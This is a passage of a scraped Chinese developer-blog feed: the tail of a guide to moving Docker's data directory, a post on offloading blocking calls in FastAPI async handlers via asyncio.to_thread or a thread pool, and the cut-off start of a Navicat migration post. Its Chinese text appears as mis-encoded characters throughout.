<blockquote>
<p>â— åŠ¡å¿…å…ˆç¡®è®¤æ–°è·¯å¾„å·¥ä½œæ­£å¸¸å†åˆ é™¤ï¼</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">âš ï¸ å…¶ä»–æ–¹æ³•ï¼ˆä¸æ¨èï¼‰</h2>
<h3 data-id="heading-7">æ–¹æ³• 2ï¼šé€šè¿‡è½¯é“¾æ¥ï¼ˆSymlinkï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl stop docker
sudo <span class="hljs-built_in">mv</span> /var/lib/docker /data/docker
sudo <span class="hljs-built_in">ln</span> -s /data/docker /var/lib/docker
sudo systemctl start docker
</code></pre>
<ul>
<li>ç®€å•ï¼Œä½†æŸäº›å·¥å…·å¯èƒ½ä¸å…¼å®¹ç¬¦å·é“¾æ¥ã€‚</li>
<li>ä¸å¦‚ <code>daemon.json</code> æ–¹å¼è§„èŒƒã€‚</li>
</ul>
<h3 data-id="heading-8">æ–¹æ³• 3ï¼šä¿®æ”¹ systemd å¯åŠ¨å‚æ•°ï¼ˆè¿‡æ—¶ï¼‰</h3>
<p>æ—©æœŸç‰ˆæœ¬å¯é€šè¿‡ä¿®æ”¹ <code>/etc/default/docker</code> æˆ– systemd service æ–‡ä»¶åŠ  <code>-g /new/path</code>ï¼Œä½† <strong>Docker å®˜æ–¹å·²å¼ƒç”¨æ­¤æ–¹å¼</strong>ï¼Œæ¨èä½¿ç”¨ <code>daemon.json</code>ã€‚</p>
<hr/>
<h2 data-id="heading-9">ğŸ”’ æƒé™ä¸ SELinux æ³¨æ„äº‹é¡¹</h2>
<ul>
<li>ç¡®ä¿æ–°ç›®å½•æƒé™æ­£ç¡®ï¼š
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">chown</span> root:root /data/docker
sudo <span class="hljs-built_in">chmod</span> 700 /data/docker
</code></pre>
</li>
<li>å¦‚æœå¯ç”¨äº† SELinuxï¼ˆå¦‚ CentOS/RHELï¼‰ï¼Œå¯èƒ½éœ€è¦è°ƒæ•´ä¸Šä¸‹æ–‡ï¼š
<pre><code class="hljs language-bash" lang="bash">sudo semanage fcontext -a -t container_var_lib_t <span class="hljs-string">"/data/docker(/.*)?"</span>
sudo restorecon -R /data/docker
</code></pre>
</li>
</ul>
<hr/>
<h2 data-id="heading-10">ğŸ“Œ éªŒè¯æ˜¯å¦ç”Ÿæ•ˆ</h2>
<ol>
<li>æ‹‰å–ä¸€ä¸ªæ–°é•œåƒï¼š
<pre><code class="hljs language-bash" lang="bash">docker pull hello-world
</code></pre>
</li>
<li>æ£€æŸ¥æ–°è·¯å¾„ä¸‹æ˜¯å¦æœ‰æ•°æ®ï¼š
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">ls</span> /data/docker/
<span class="hljs-comment"># åº”çœ‹åˆ° containers, image, overlay2, volumes ç­‰ç›®å½•</span>
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-11">âŒ å¸¸è§é”™è¯¯</h2>





















<table><thead><tr><th>é—®é¢˜</th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><code>docker: Error response from daemon: ...</code></td><td>æ£€æŸ¥ <code>daemon.json</code> JSON æ ¼å¼æ˜¯å¦åˆæ³•ï¼ˆå¯ç”¨ <a href="https://link.juejin.cn?target=https" target="_blank" title="https" ref="nofollow noopener noreferrer">jsonlint.com</a> éªŒè¯ï¼‰</td></tr><tr><td>å¯åŠ¨å¤±è´¥</td><td>æŸ¥çœ‹æ—¥å¿—ï¼š<code>journalctl -u docker.service -n 50</code></td></tr><tr><td>ç£ç›˜ç©ºé—´æœªé‡Šæ”¾</td><td>ç¡®è®¤æ˜¯å¦çœŸçš„è¿ç§»äº†æ•°æ®ï¼Œæˆ–æ—§ç›®å½•æœªåˆ é™¤</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-12">âœ… æ€»ç»“</h2>

























<table><thead><tr><th>æ“ä½œ</th><th>å‘½ä»¤</th></tr></thead><tbody><tr><td>åœæ­¢ Docker</td><td><code>sudo systemctl stop docker</code></td></tr><tr><td>é…ç½®æ–°è·¯å¾„</td><td>ç¼–è¾‘ <code>/etc/docker/daemon.json</code>ï¼ŒåŠ  <code>"data-root": "/your/path"</code></td></tr><tr><td>å¯åŠ¨ Docker</td><td><code>sudo systemctl start docker</code></td></tr><tr><td>éªŒè¯</td><td><code>docker info | grep "Docker Root Dir"</code></td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>æœ€ä½³å®è·µ</strong>ï¼šåœ¨æ–°æœåŠ¡å™¨éƒ¨ç½²æ—¶å°±é…ç½®å¥½ <code>data-root</code>ï¼Œé¿å…åæœŸè¿ç§»ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FastAPIå¼‚æ­¥æ–¹æ³•ä¸­è°ƒç”¨åŒæ­¥æ–¹æ³•]]></title>    <link>https://juejin.cn/post/7597968460651610154</link>    <guid>https://juejin.cn/post/7597968460651610154</guid>    <pubDate>2026-01-22T06:59:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597968460651610154" data-draft-id="7597900782911324179" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" FastAPIå¼‚æ­¥æ–¹æ³•ä¸­è°ƒç”¨åŒæ­¥æ–¹æ³• "/> <meta itemprop="keywords" content="å¾®ä¿¡å°ç¨‹åº"/> <meta itemprop="datePublished" content="2026-01-22T06:59:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§é»„è¯„æµ‹"/> <meta itemprop="url" content="https://juejin.cn/user/714024404135696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             FastAPIå¼‚æ­¥æ–¹æ³•ä¸­è°ƒç”¨åŒæ­¥æ–¹æ³• 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/714024404135696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§é»„è¯„æµ‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:59:39.000Z" title="Thu Jan 22 2026 06:59:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ FastAPI çš„å¼‚æ­¥ï¼ˆ<code>async def</code>ï¼‰è§†å›¾å‡½æ•°ä¸­ç›´æ¥è°ƒç”¨<strong>åŒæ­¥æ–¹æ³•</strong>ï¼ˆå°¤å…¶æ˜¯ I/O å¯†é›†å‹æ“ä½œï¼Œå¦‚æ•°æ®åº“æŸ¥è¯¢ã€æ–‡ä»¶è¯»å†™ã€ç½‘ç»œè¯·æ±‚ç­‰ï¼‰ï¼Œä¼šå¯¼è‡´<strong>é˜»å¡äº‹ä»¶å¾ªç¯</strong>ï¼Œä¸¥é‡é™ä½å¹¶å‘æ€§èƒ½ï¼Œç”šè‡³ä½¿å¼‚æ­¥æ¡†æ¶çš„ä¼˜åŠ¿å®Œå…¨ä¸§å¤±ã€‚</p>
<p>ä½†ç°å®å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¸¸éœ€è°ƒç”¨ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ <code>requests</code>ã€<code>pymysql</code>ã€<code>cv2</code> ç­‰ï¼‰â€”â€”å®ƒä»¬å¤§å¤šæ˜¯åŒæ­¥çš„ã€‚æ­¤æ—¶ï¼Œ<strong>ä¸èƒ½ç›´æ¥è°ƒç”¨</strong>ï¼Œè€Œåº”é€šè¿‡ <strong><code>asyncio.to_thread()</code></strong> æˆ– <strong>çº¿ç¨‹æ± </strong> å°†å…¶â€œå¼‚æ­¥åŒ–â€ã€‚</p>
<hr/>
<h2 data-id="heading-0">âœ… æ­£ç¡®åšæ³•ï¼šä½¿ç”¨ <code>asyncio.to_thread()</code>ï¼ˆæ¨èï¼ŒPython 3.9+ï¼‰</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

app = FastAPI()

<span class="hljs-comment"># åŒæ­¥å‡½æ•°ï¼ˆæ¨¡æ‹Ÿè€—æ—¶I/Oï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sync_blocking_task</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿé˜»å¡</span>
    <span class="hljs-keyword">return</span> x * <span class="hljs-number">2</span>

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/async-correct"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">async_correct</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-comment"># âœ… æ­£ç¡®ï¼šå°†åŒæ­¥ä»»åŠ¡äº¤ç»™çº¿ç¨‹æ± æ‰§è¡Œï¼Œä¸é˜»å¡äº‹ä»¶å¾ªç¯</span>
    result = <span class="hljs-keyword">await</span> asyncio.to_thread(sync_blocking_task, x)
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"result"</span>: result}
</code></pre>
<blockquote>
<p>âœ… <strong>ä¼˜ç‚¹</strong>ï¼šä»£ç ç®€æ´ï¼Œè‡ªåŠ¨ä½¿ç”¨é»˜è®¤çº¿ç¨‹æ± ï¼Œé¿å…é˜»å¡ä¸»äº‹ä»¶å¾ªç¯ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">ğŸ” å…¼å®¹ Python &lt; 3.9ï¼šæ‰‹åŠ¨åˆ›å»ºçº¿ç¨‹æ± </h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

app = FastAPI()

<span class="hljs-comment"># å…¨å±€çº¿ç¨‹æ± ï¼ˆå¯å¤ç”¨ï¼‰</span>
executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">sync_task</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">import</span> time
    time.sleep(<span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> x * <span class="hljs-number">2</span>

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/async-with-pool"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">with_pool</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>):
    loop = asyncio.get_event_loop()
    result = <span class="hljs-keyword">await</span> loop.run_in_executor(executor, sync_task, x)
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"result"</span>: result}
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šä¸è¦åœ¨æ¯æ¬¡è¯·æ±‚ä¸­åˆ›å»ºæ–°çº¿ç¨‹æ± ï¼Œåº”å…¨å±€å¤ç”¨ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">âŒ é”™è¯¯ç¤ºèŒƒï¼šç›´æ¥è°ƒç”¨åŒæ­¥å‡½æ•°</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/async-wrong"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">async_wrong</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-comment"># âŒ å±é™©ï¼ä¼šé˜»å¡æ•´ä¸ªäº‹ä»¶å¾ªç¯</span>
    result = sync_blocking_task(x)  <span class="hljs-comment"># ç›´æ¥è°ƒç”¨</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"result"</span>: result}
</code></pre>
<p><strong>åæœ</strong>ï¼š</p>
<ul>
<li>æ‰€æœ‰å¹¶å‘è¯·æ±‚éƒ½ä¼šè¢«ä¸²è¡Œæ‰§è¡Œï¼›</li>
<li>é«˜å¹¶å‘ä¸‹å“åº”æ—¶é—´æ€¥å‰§ä¸Šå‡ï¼›</li>
<li>å¤±å»ä½¿ç”¨ FastAPI å¼‚æ­¥æ¶æ„çš„æ„ä¹‰ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-3">ğŸ§  ä½•æ—¶å¯ä»¥å®‰å…¨è°ƒç”¨åŒæ­¥ä»£ç ï¼Ÿ</h2>
<p>ä»…é™ä»¥ä¸‹æƒ…å†µï¼š</p>
<ul>
<li><strong>çº¯ CPU è®¡ç®—ä¸”è€—æ—¶æçŸ­</strong>ï¼ˆå¦‚ç®€å•æ•°å­¦è¿ç®—ã€å­—ç¬¦ä¸²å¤„ç†ï¼‰ï¼›</li>
<li><strong>ä¸æ¶‰åŠ I/Oã€sleepã€é”ç­‰å¾…ç­‰é˜»å¡æ“ä½œ</strong>ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/safe-sync"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_sync</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-comment"># âœ… å®‰å…¨ï¼šçº¯è®¡ç®—ï¼Œæ— é˜»å¡</span>
    total = <span class="hljs-built_in">sum</span>(i * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n))
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"total"</span>: total}
</code></pre>
<blockquote>
<p>ğŸ’¡ åŸåˆ™ï¼š<strong>åªè¦å‡½æ•°å¯èƒ½â€œç­‰å¾…â€ï¼ˆwaitï¼‰ï¼Œå°±å¿…é¡»å¼‚æ­¥åŒ–æˆ–æ”¾çº¿ç¨‹æ± </strong>ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">ğŸ›  å®æˆ˜å»ºè®®ï¼šæ•°æ®åº“ä¸ HTTP è¯·æ±‚</h2>

























<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>æ•°æ®åº“</td><td>ä½¿ç”¨å¼‚æ­¥é©±åŠ¨ï¼š - PostgreSQL â†’ <code>asyncpg</code> + <code>databases</code> - MySQL â†’ <code>aiomysql</code> / <code>asyncmy</code> - ORM â†’ <code>SQLModel</code>ï¼ˆåŒæ­¥ï¼‰æˆ– <code>Tortoise-ORM</code>ï¼ˆå¼‚æ­¥ï¼‰</td></tr><tr><td>HTTP è¯·æ±‚</td><td>ç”¨ <code>httpx.AsyncClient</code> æ›¿ä»£ <code>requests</code></td></tr><tr><td>æ–‡ä»¶è¯»å†™</td><td>ç”¨ <code>aiofiles</code> åº“</td></tr><tr><td>ç¬¬ä¸‰æ–¹åŒæ­¥åº“</td><td>åŒ…è£…è¿› <code>asyncio.to_thread()</code></td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼šç”¨ <code>httpx</code> å¼‚æ­¥è¯·æ±‚</p>
<pre><code class="hljs language-csharp" lang="csharp">import httpx

@app.<span class="hljs-keyword">get</span>(<span class="hljs-string">"/fetch"</span>)
<span class="hljs-function"><span class="hljs-keyword">async</span> def <span class="hljs-title">fetch_data</span>():
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> httpx.<span class="hljs-title">AsyncClient</span>() <span class="hljs-keyword">as</span> client:
        resp</span> = <span class="hljs-keyword">await</span> client.<span class="hljs-keyword">get</span>(<span class="hljs-string">"https://api.example.com/data"</span>)
        <span class="hljs-keyword">return</span> resp.json()
</code></pre>
<hr/>
<h2 data-id="heading-5">âœ… æ€»ç»“</h2>






























<table><thead><tr><th>åšæ³•</th><th>æ˜¯å¦æ¨è</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>await asyncio.to_thread(sync_func)</code></td><td>âœ… å¼ºçƒˆæ¨è</td><td>Python 3.9+ æœ€ä½³å®è·µ</td></tr><tr><td><code>loop.run_in_executor(thread_pool, sync_func)</code></td><td>âœ… å¯ç”¨</td><td>å…¼å®¹æ—§ç‰ˆæœ¬</td></tr><tr><td>åœ¨ <code>async def</code> ä¸­ç›´æ¥è°ƒç”¨ <code>sync_func()</code></td><td>âŒ ä¸¥ç¦</td><td>é˜»å¡äº‹ä»¶å¾ªç¯ï¼Œç ´åå¹¶å‘</td></tr><tr><td>çº¯è®¡ç®—å‹åŒæ­¥ä»£ç </td><td>âœ… å¯æ¥å—</td><td>æ—  I/Oï¼Œä¸å½±å“æ€§èƒ½</td></tr></tbody></table>
<blockquote>
<p><strong>è®°ä½</strong>ï¼šFastAPI çš„å¼‚æ­¥èƒ½åŠ›åªæœ‰åœ¨<strong>å…¨ç¨‹éé˜»å¡</strong>æ—¶æ‰èƒ½å‘æŒ¥æœ€å¤§ä»·å€¼ã€‚é‡åˆ°åŒæ­¥åº“ï¼Œåˆ«çŠ¹è±«â€”â€”<strong>æ‰”è¿›çº¿ç¨‹æ± </strong>ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ä¸ªæœˆæå®š100+è¡¨è¿ç§»ï¼šæˆ‘çš„â€œå·å¸ˆâ€Navicatå®æˆ˜å¤ç›˜]]></title>    <link>https://juejin.cn/post/7597278451030294538</link>    <guid>https://juejin.cn/post/7597278451030294538</guid>    <pubDate>2026-01-21T01:04:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451030294538" data-draft-id="7597252004713725994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ä¸ªæœˆæå®š100+è¡¨è¿ç§»ï¼šæˆ‘çš„â€œå·å¸ˆâ€Navicatå®æˆ˜å¤ç›˜"/> <meta itemprop="keywords" content="åç«¯,Java,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-21T01:04:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€æ—…äºº"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ä¸ªæœˆæå®š100+è¡¨è¿ç§»ï¼šæˆ‘çš„â€œå·å¸ˆâ€Navicatå®æˆ˜å¤ç›˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€æ—…äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T01:04:47.000Z" title="Wed Jan 21 2026 01:04:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    114
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 